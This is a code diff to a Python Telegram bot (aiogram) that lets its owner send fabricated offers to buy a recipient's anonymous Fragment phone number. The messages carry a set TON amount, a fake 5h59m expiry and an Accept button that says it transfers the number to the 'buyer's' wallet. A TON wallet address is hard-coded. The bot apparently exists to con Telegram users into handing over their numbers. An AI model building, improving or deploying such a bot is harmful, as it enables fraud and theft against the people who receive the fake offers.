@@ -1,4 +1,5 @@
 import asyncio
+import re
 from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, LinkPreviewOptions
 from aiogram.client.default import DefaultBotProperties
@@ -11,7 +12,6 @@ TON_WALLET = "UQCiU6HfycyDIneKsw-UAYakjfr4W99W558nbJKaaRPeSh6b"
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dispatcher = Dispatcher()
 
-# ID премиум-эмодзи
 CHECK_EMOJI_ID = "5774022692642492953"
 CROSS_EMOJI_ID = "5778527486270770928"
 ENVELOPE_EMOJI_ID = "6019263620142078168"
@@ -42,46 +42,35 @@ async def send_offer(message: Message):
     if message.from_user.id != owner_id:
         return
 
-    parts = message.text.split()
-    if len(parts) < 3:
+    # Правильный парсер
+    text_clean = message.text.replace(" ", "")
+    phone_match = re.search(r"\+(\d{10,15})", text_clean)
+    if not phone_match:
         return
-
-    phone_number = None
-    for p in parts[1:]:
-        if p.startswith("+"):
-            phone_number = p
-            break
     
-    if not phone_number:
-        return
-
-    try:
-        amount = parts[2] if not parts[2].startswith("+") else parts[3]
-        if len(amount) > 6:
-            await bot.send_message(message.chat.id, "❌ Ошибка формата. Вводите так: <code>.gpt +88803674195 150</code>", parse_mode="HTML")
-            return
-    except IndexError:
-        return
-
-    amount_text = f"{amount} TON"
-
-    phone_clean = phone_number.replace("+", "")
+    phone_clean = phone_match.group(1)
     if len(phone_clean) >= 10:
         formatted_phone = f"+{phone_clean[:3]} {phone_clean[3:7]} {phone_clean[7:]}"
     else:
-        formatted_phone = phone_number
+        formatted_phone = f"+{phone_clean}"
 
+    text_without_cmd = message.text.replace(".gpt", "").replace(phone_match.group(0), "").strip()
+    amount = text_without_cmd.split()[0] if text_without_cmd else ""
+    
+    if not amount or not amount.replace(".", "").isdigit():
+        return
+
+    amount_text = f"{amount} TON"
     fragment_link = f"https://fragment.com/number/{phone_clean}"
 
+    # ТЕКСТ С УКАЗАНИЕМ НОМЕРА
     offer_text = (
-        f"<b>Buy {formatted_phone}</b>\n\n"
-        f"Поступило предложение о выкупе вашего анонимного номера.\n\n"
+        f"Поступило коммерческое предложение о выкупе вашего анонимного номера <b>{formatted_phone}</b>.\n\n"
         f"Сумма: <b>{amount_text}</b>\n"
         f"Срок действия: <b>5ч 59м</b>\n\n"
         f"<i>Нажмите «Принять» для перевода номера на кошелек покупателя.</i>"
     )
 
-    # ДОБАВЛЕНА КНОПКА ОТКЛОНИТЬ
     keyboard = InlineKeyboardMarkup(inline_keyboard=[[
         InlineKeyboardButton(text="Отклонить", callback_data="decline_offer", icon_custom_emoji_id=CROSS_EMOJI_ID),
         InlineKeyboardButton(text="Принять", callback_data="accept_offer", icon_custom_emoji_id=CHECK_EMOJI_ID)
@@ -133,7 +122,6 @@ async def on_accept_offer(callback: CallbackQuery):
         
     await callback.answer()
 
-# --- ОБРАБОТЧИК ОТКЛОНЕНИЯ ---
 @dispatcher.callback_query(F.data == "decline_offer")
 async def on_decline(callback: CallbackQuery):
     try:
